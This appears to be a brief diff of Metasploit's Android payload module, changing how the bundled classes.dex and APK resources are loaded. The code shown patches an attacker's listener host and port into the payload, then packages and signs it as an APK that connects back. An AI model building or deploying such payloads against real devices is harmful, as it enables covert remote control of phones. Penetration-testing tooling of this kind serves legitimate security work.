@@ -31,7 +31,7 @@ module Metasploit3
   def generate_jar(opts={})
     jar = Rex::Zip::Jar.new
 
-    classes = File.read(File.join(Msf::Config::InstallRoot, 'data', 'android', 'apk', 'classes.dex'), {:mode => 'rb'})
+    classes = MetasploitPayloads.read('android', 'apk', 'classes.dex')
 
     string_sub(classes, 'XXXX127.0.0.1                       ', "XXXX" + datastore['LHOST'].to_s) if datastore['LHOST']
     string_sub(classes, 'YYYY4444                            ', "YYYY" + datastore['LPORT'].to_s) if datastore['LPORT']
@@ -44,7 +44,7 @@ module Metasploit3
       [ "resources.arsc" ]
     ]
 
-    jar.add_files(files, File.join(Msf::Config.data_directory, "android", "apk"))
+    jar.add_files(files, MetasploitPayloads.path("android", "apk"))
     jar.build_manifest
 
     cert, key = generate_cert
